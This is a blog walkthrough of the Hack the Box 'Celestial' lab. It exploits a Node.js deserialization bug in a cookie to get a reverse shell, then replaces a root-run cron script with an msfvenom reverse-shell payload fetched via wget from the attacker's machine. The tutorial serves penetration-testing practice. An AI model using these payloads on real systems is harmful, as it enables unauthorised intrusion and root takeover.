@@ -1,0 +1,611 @@
+
+								
+																		Hack the Box: Celestial Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 26, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Celestial” which is lab presented by Hack the Box and is available online for those who want to increase their skill in penetration testing and black box testing. Celestial is a retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Intermediate
+Task: find user.txt and root.txt file in the victim’s machine.
+WalkThrough
+Since these labs are online available therefore they have static IP. The IP of Celestial is 10.10.10.85 
+Let’s start off with scanning the network to find our target.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.85
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.85
+					
+				
+			
+		
+
+
+The NMAP output shows us that the port TCP 3000 is opened on the target machine  Let’s try to access the website on a Non-standard HTTP port (3000) as follows :
+Browse to http://10.10.10.85:3000 and we will be greeted with the following page
+
+As we didn’t find any other clue to move forward after navigating through many other possibilities; we quickly moved further to understand the website request via Burpsuite tool. Therefore, upon capturing the webpage’s GET request, we noticed the profile= Cookie parameter (highlighted in red)
+
+Copy the entire value inside the profile= cookie parameter and paste it in the Burpsuite decoder.
+
+		
+		
+			
+			
+			
+			
+eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
+			
+				
+					
+				
+					1
+				
+						eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
+					
+				
+			
+		
+
+On decoding the same we will get the output in base64 format. Once again, we will decode the base64 format output and would be able to see the results in a clear text format. The output displays the username and other details of a specific user This is an indication that we can insert our code in the cookie profile parameter value to get the desired results.
+
+On further investigation, we came to know that this is a Node JS deserialization bug for the purpose of remote code execution. Further details of the same are mentioned in the below website.If we read the entire content of the website, we will observe that there is a function which contains a particular string comprising of multiple numeric values.
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+
+Copy the entire numeric content (after String.fromCharCode) starting from 10 till 10 . Navigate to the URL https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html and convert Decimal to ASCII as shown in the screenshot below
+
+Now let’s change the contents of the ASCII text and replace the HOST and PORT parameter details with the HOST=10.10.14.3 and PORT= 4444, where 10.10.14.3 is our Kali machine IP. Once done, we will get the equivalent output in the Decimal format as shown below
+
+Copy the decimal output from the above screenshot starting from 118 and ending with 10, with each number, separated by a comma.
+Note: As we can see that the decimal output in the above output is separated by a space, hence we need to either do it manually OR need to refer to the following Python script method so as to include the comma values, before proceeding further
+https://github.com/Sayantan5/Holiday/blob/master/encode.py
+Once the decimal output (separated by comma) is ready, we need to now paste it inside the code shown below (replace the value with decimal output) and perform the Base64 encode of the same
+
+		
+		
+			
+			
+			
+			
+echo {"username":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(value) )}()"} | base64 -w0
+			
+				
+					
+				
+					1
+				
+						echo {"username":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(value) )}()"} | base64 -w0
+					
+				
+			
+		
+
+
+Copy the encoded output above and paste it in front of the Profile= parameter of the Burpsuite as shown in the image below.
+
+Once done we need to click on the Forward option, in Burpsuite Intercept tab
+Note: Before forwarding the modified content in Burpsuite, we should set up the netcat listener in Kali machine and keep it ready.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 4444
+			
+				
+					
+				
+					1
+				
+						nc -lvp 4444
+					
+				
+			
+		
+
+In order to access proper TTY shell, we had imported python one line script by typing following:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+Hurray !! We got into the reverse shell of the target machine
+Let’s have a quick look at the contents
+
+		
+		
+			
+			
+			
+			
+ls
+			
+				
+					
+				
+					1
+				
+						ls
+					
+				
+			
+		
+
+We navigated to many folders, however, found interesting stuff in the Documents folder
+
+		
+		
+			
+			
+			
+			
+cd Documents
+			
+				
+					
+				
+					1
+				
+						cd Documents
+					
+				
+			
+		
+
+Here we can see that there is a user.txt file, lets read it contents
+
+		
+		
+			
+			
+			
+			
+cat user.txt
+			
+				
+					
+				
+					1
+				
+						cat user.txt
+					
+				
+			
+		
+
+Finally, we got our first flag i.e  output of the user.txt file 
+
+Now upon further navigation, we also opened the script.py file because of our curiosity to examine the contents of the same. If we do cat script.py, the output displays as print “Script is running”
+
+		
+		
+			
+			
+			
+			
+cat script.py
+			
+				
+					
+				
+					1
+				
+						cat script.py
+					
+				
+			
+		
+
+print “Script is running..”
+Note: This is an indication that we may need to examine the log files to see which script is running and if it is running on a periodic basis
+The best step to move forward is to examine the contents of the log directory in var
+
+		
+		
+			
+			
+			
+			
+cd /var/log
+			
+				
+					
+				
+					1
+				
+						cd /var/log
+					
+				
+			
+		
+
+Let’s see the files listed over here
+
+		
+		
+			
+			
+			
+			
+ls
+			
+				
+					
+				
+					1
+				
+						ls
+					
+				
+			
+		
+
+As we can see that there are multiple syslog files being generated in this folder. The old logs are being zipped and numbered accordingly. The latest logs are always stored in the log file named syslog .So we will open the contents of the syslog file and try to find out if there is something interesting going on.
+
+		
+		
+			
+			
+			
+			
+cat syslog
+			
+				
+					
+				
+					1
+				
+						cat syslog
+					
+				
+			
+		
+
+We will notice that there is a cronjob running every 5 minutes, which is copying the output of script.py file (in the home/sun/Documents folder) to the output.txt file
+
+Now we can try to put our own content in the script.py file. For this let’s generate a Reverse shell with the following command
+
+		
+		
+			
+			
+			
+			
+msfvenom -p cmd/unix/reverse_python lhost=10.10.14.3 lport=1234 R
+			
+				
+					
+				
+					1
+				
+						msfvenom -p cmd/unix/reverse_python lhost=10.10.14.3 lport=1234 R
+					
+				
+			
+		
+
+Copy the contents of msfvenom output and save it on Kali Desktop named as script.py, which will be further used in the subsequent steps
+
+Now run the web server on the Kali machine
+
+		
+		
+			
+			
+			
+			
+python -m SimpleHTTPServer 80
+			
+				
+					
+				
+					1
+				
+						python -m SimpleHTTPServer 80
+					
+				
+			
+		
+
+
+Lets read the contents of the script.py.The output displays as print “Script is running..”
+
+		
+		
+			
+			
+			
+			
+cat script.py
+			
+				
+					
+				
+					1
+				
+						cat script.py
+					
+				
+			
+		
+
+Let’s move this original python script (script.py) by renaming it to script.py.original as shown below
+
+		
+		
+			
+			
+			
+			
+mv script.py script.py.original
+			
+				
+					
+				
+					1
+				
+						mv script.py script.py.original
+					
+				
+			
+		
+
+Download our newly created script.py from the Kali machine Desktop
+
+		
+		
+			
+			
+			
+			
+wget http://10.10.14.3/script.py
+			
+				
+					
+				
+					1
+				
+						wget http://10.10.14.3/script.py
+					
+				
+			
+		
+
+ 
+Open a netcat reverse shell
+
+		
+		
+			
+			
+			
+			
+nc -lvp 1234
+			
+				
+					
+				
+					1
+				
+						nc -lvp 1234
+					
+				
+			
+		
+
+In order to access proper TTY shell, we had imported python one line script by typing following:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+Hurray!! We got into the root
+Navigate to the root directory
+
+		
+		
+			
+			
+			
+			
+cd /root
+			
+				
+					
+				
+					1
+				
+						cd /root
+					
+				
+			
+		
+
+Let’s see what content it has.
+
+		
+		
+			
+			
+			
+			
+ls
+			
+				
+					
+				
+					1
+				
+						ls
+					
+				
+			
+		
+
+As we can see it contains 2 files root.txt and script.py. Lets open root.txt file
+
+		
+		
+			
+			
+			
+			
+cat root.txt
+			
+				
+					
+				
+					1
+				
+						cat root.txt
+					
+				
+			
+		
+
+
+Wonderful!! We have gained access to both user.txt and root.txt files and hacked this box.
+Author: Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Skyw3lker August 27, 2018 at 1:05 pm							
+							
+							
+														
+							
+								Could anyone explain 
+Msfvenom R option is used for ?
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
